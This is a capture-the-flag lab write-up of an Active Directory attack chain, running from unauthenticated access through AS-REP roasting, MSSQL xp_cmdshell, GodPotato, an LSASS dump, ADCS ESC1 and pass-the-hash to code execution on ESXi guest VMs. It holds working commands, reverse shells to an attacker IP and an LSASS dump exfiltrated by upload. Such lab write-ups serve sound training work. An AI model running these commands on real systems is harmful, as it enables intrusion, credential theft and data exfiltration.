# AD-RTS: UnAuthenticated Attack Path Write-up

Source: CyberWarFare Labs (AD-RTS Challenge Lab)
Scenario: Unauthenticated → Domain Admin → ESXi Guest VM compromise

## Objective

Targeted cyber operation against "TELECOM INC." — compromise critical servers and exfiltrate sensitive data. Simulates APT attack starting from unauthenticated position in internal network.

## Scope

- Target Network: 10.5.2.0/24 (10.5.2.1 out of scope)
- Domain: telecore.ad
- DC IP: 10.5.2.2

## Attack Chain Summary

```
DNS Zone Transfer → LDAP Anon Enum → AS-REP Roast → MSSQL Access →
xp_cmdshell RCE → SeImpersonate (GodPotato) → LSASS Dump →
ADCS ESC1 → Domain Admin → ESXi → Guest VM RCE
```

## Phase 1: Recon — DNS Zone Transfer

### Discover DNS Servers
```bash
nmap -sU -p 53 --open 10.5.2.0/24
```

### Configure DNS
```bash
sudo nano /etc/resolv.conf
# nameserver 10.5.2.99
```

### PTR Sweep (reverse records)
```bash
for i in {1..254}; do echo -n "10.5.2.$i "; dig +short -x 10.5.2.$i; done > /tmp/ptrs.txt
```

### Zone Transfer (reverse + forward)
```bash
dig @10.5.2.99 2.5.10.in-addr.arpa AXFR
dig @10.5.2.99 telecore.ad AXFR
```

## Phase 2: Recon — LDAP Anonymous Enumeration

### Query Domain Context
```bash
ldapsearch -x -H ldap://10.5.2.2 -s base
```

### Enumerate Groups
```bash
ldapsearch -x -H ldap://10.5.2.2 -b 'DC=TELECORE,DC=AD' 'objectClass=group'
```

### Enumerate Users
```bash
ldapsearch -x -H ldap://10.5.2.2 -b 'DC=TELECORE,DC=AD' 'objectClass=user' name distinguishedName
```

### Enumerate Computers
```bash
ldapsearch -x -H ldap://10.5.2.2 -b 'DC=TELECORE,DC=AD' 'objectClass=computer' name distinguishedName
```

## Phase 3: Credential Harvest — AS-REP Roasting

### Check for no-preauth users
```bash
impacket-GetNPUsers telecore.ad/ -dc-ip 10.5.2.2 -usersfile names -format hashcat | grep -v 'Kerberos SessionError'
```

Result: `tel_support01` has DO NOT REQUIRE PREAUTH set.

### Crack the hash
```bash
echo 'extracted_hash' > hash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep hash
```

## Phase 4: Initial Access — MSSQL Server

### Login with cracked creds
```bash
impacket-mssqlclient tel_support01:'<Cracked_Pass>'@10.5.2.22 -debug -windows-auth
```

### Enable xp_cmdshell & verify RCE
```sql
enable_xp_cmdshell
xp_cmdshell whoami
```
Result: Running as `nt service\mssql$sqlexpress`

### Reverse Shell via PowerShell encoded payload
```bash
# Attacker: start listener
nc -nlvp 2345

# On MSSQL:
xp_cmdshell powershell -e <encoded_reverse_shell_command>
```

## Phase 5: Privilege Escalation — SeImpersonate → SYSTEM

### Check privileges
```cmd
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```
Result: SeImpersonatePrivilege enabled, Windows Server 2022.

### GodPotato exploitation
```powershell
cd C:\Users\Public\
iwr -UseBasicParsing http://<VPN_IP>:8080/GodPotato-NET4.exe -OutFile GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

### SYSTEM reverse shell
```bash
# Generate rev.ps1, encode to base64:
cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0

# Attacker listener:
nc -nlvp 1234

# Execute on target:
cmd /c GodPotato-NET4.exe -cmd "powershell -nop -w hidden -enc <BASE64>"
```

## Phase 6: Credential Dump — LSASS via comsvcs.dll

```cmd
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\users\Public\lsass.dmp full
Compress-Archive -Path lsass.dmp -DestinationPath lsass.zip
```

### Exfiltrate & parse
```bash
# Attacker: run upload server (python3 http_upload.py)
# Target:
Invoke-WebRequest -Uri "http://<VPN_IP>:8000/lsass.zip" -Method Post -InFile "C:\Users\Public\lsass.zip"

# Attacker: extract creds
unzip lsass.zip
pypykatz lsa minidump lsass.dmp
```
Result: `tel_engineer01` NTLM hash obtained.

## Phase 7: ADCS ESC1 — Certificate Abuse to Domain Admin

### Find vulnerable templates
```bash
certipy-ad find -u 'tel_engineer01@telecore.ad' -hashes <Hash> -dc-ip 10.5.2.2 -enabled -vuln -ldap-scheme ldap -stdout
```
Result: ESC1 vulnerable — template allows specifying SAN.

### Get Administrator SID
```bash
rpcclient --user 'telecore.ad/tel_engineer01' --pw-nt-hash 10.5.2.2 -c "lookupnames administrator"
```

### Request cert as Administrator
```bash
certipy-ad -debug req -u 'tel_engineer01@telecore.ad' -hashes <HASH> -target 10.5.2.8 -ca 'telecore-PKI-SRV-CA' -template 'Tel_User' -upn 'administrator@telecore.ad' -sid '<Admin_SID>'
```

### Authenticate with cert → get DA hash
```bash
certipy-ad -debug auth -pfx administrator.pfx -dc-ip 10.5.2.2
```

## Phase 8: Domain Controller RCE

```bash
# List shares
smbclient -L 10.5.2.2 -U 'administrator%HASH' --pw-nt-hash

# WMIExec shell as DA
wmiexec.py -hashes :<HASH> 'administrator@10.5.2.2'
```

## Phase 9: ESXi Hypervisor Attack

### Crack DA NTLM for cleartext (SSH needs password)
```bash
hashcat -m 1000 -a 0 DA_Hash.txt /usr/share/wordlists/rockyou.txt
```

### Enumerate Guest VMs via pyVmomi
```python
#!/usr/bin/env python3
import ssl
from pyVim.connect import SmartConnect, Disconnect
from pyVmomi import vim

ctx = ssl._create_unverified_context()
si = SmartConnect(host="10.5.2.111", user="administrator@telecore.ad",
    pwd="<Admin_Pass>", sslContext=ctx)
content = si.RetrieveContent()

for vm in content.viewManager.CreateContainerView(
    content.rootFolder, [vim.VirtualMachine], True).view:
    ip = vm.guest.ipAddress or (
        vm.guest.net[0].ipConfig.ipAddress[0].ipAddress if vm.guest.net else "N/A")
    print(f"VM: {vm.name}\n  Power: {vm.runtime.powerState}\n"
          f"  OS: {vm.config.guestFullName}\n  Tools: {vm.guest.toolsStatus}\n"
          f"  IP: {ip}\n  Notes: {vm.config.annotation}\n")
Disconnect(si)
```

Result: VaultVM found at 10.5.2.50, VMware Tools installed, creds in annotations.

### RCE on Guest VM via VMware Tools
```bash
python3 cmd_exec.py --host 10.5.2.111 --user administrator@telecore.ad \
  --password 'DA_Pass' --vm 'VaultVM' --guest-user linux --guest-pass 'PASS' \
  --cmd /bin/bash --args "-c 'bash -i >& /dev/tcp/<VPN_IP>/5556 0>&1'"
```

## Key Techniques Reference

| Technique | Tool | Phase |
|-----------|------|-------|
| DNS Zone Transfer | dig AXFR | Recon |
| LDAP Anonymous Bind | ldapsearch -x | Recon |
| AS-REP Roasting | impacket-GetNPUsers | Cred Harvest |
| MSSQL xp_cmdshell | impacket-mssqlclient | Initial Access |
| SeImpersonate → SYSTEM | GodPotato-NET4.exe | PrivEsc |
| LSASS dump (comsvcs.dll) | rundll32 MiniDump | Cred Dump |
| ADCS ESC1 | certipy-ad | PrivEsc to DA |
| Pass-the-Hash | wmiexec.py | Lateral Movement |
| ESXi Guest VM RCE | pyVmomi + VMware Tools | Post-Exploit |

## Lessons Learned

1. DNS Zone Transfer gives full network map — always check first
2. LDAP anonymous bind exposes user list for AS-REP roasting
3. MSSQL with domain user creds is common initial foothold
4. comsvcs.dll MiniDump bypasses AV for LSASS dumping on patched systems
5. ADCS ESC1 is most reliable path to DA when template allows SAN
6. Post-CVE-2022-26923: must specify SID extension when requesting cert
7. Domain-joined ESXi with VMware Tools = code execution on all guest VMs
8. Always check VM annotations/notes for hardcoded credentials
